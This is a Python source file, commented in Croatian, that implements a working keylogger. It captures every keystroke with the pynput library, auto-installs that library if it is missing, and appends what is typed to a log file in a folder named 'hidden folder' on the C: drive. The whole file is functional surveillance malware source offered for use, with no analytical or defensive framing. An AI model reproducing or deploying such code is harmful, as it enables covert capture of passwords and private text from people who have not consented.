import subprocess # za instaliranje pynputa ukoliko nije instaliran
import sys        # za instaliranje pynputa ukoliko nije instaliran

try:
    from pynput import keyboard 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    from pynput import keyboard # pynput se koristi za detekciju pritisnutih tipki

class Keylogger:

##########################################################################################################################################

    def __init__(self, log_path):
        # Inicijalizacija putanje gdje će se čuvati log file
        self.log_path = log_path  
        self.log = ""  # Početni prazan log

##########################################################################################################################################

    def on_press(key):
        try:
            keylogger.log += format(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                keylogger.log += " "
            elif key == keyboard.Key.enter:
                keylogger.log += "\n"
            elif key == keyboard.Key.tab:
                keylogger.log += "[tab]"
            elif key == keyboard.Key.backspace:
                keylogger.delete_last()

        # Ažurira log file
        keylogger.update_log()

##########################################################################################################################################

    def update_log(self):
        # Otvori file u režimu dodavanja (append), kako bi se zapisivalo novo logiranje bez brisanja prethodnih podataka
        with open(self.log_path, "a", encoding="utf-8") as file:
            file.write(self.log)
            self.log = ""  # Resetira log nakon što je upisan kako nebi došlo do dupliciranja

##########################################################################################################################################

    def delete_last(self):
        # Otvori file u režimu čitanja (read), kako bi se pročitao content file-a
        with open(self.log_path, "r", encoding="utf-8") as file:
            content = file.read()
            if content: # ako nije prazan
                content = content[:-1] # cijeli sadrzaj txt datoteke se kopira osim posljednjeg znaka
            with open(self.log_path, "w", encoding="utf-8") as file:
                file.write(content) # zapisi novi sadrzaj

##########################################################################################################################################

    def start(self):
        with keyboard.Listener(
                on_press=Keylogger.on_press) as listener:
            listener.join()

##########################################################################################################################################

log_path = r"c:\skriveni_folder\log.txt"  # Putanja na kojoj će se čuvati log file

# Kreira instancu klasa i pokreće keylogger
keylogger = Keylogger(log_path)
keylogger.start()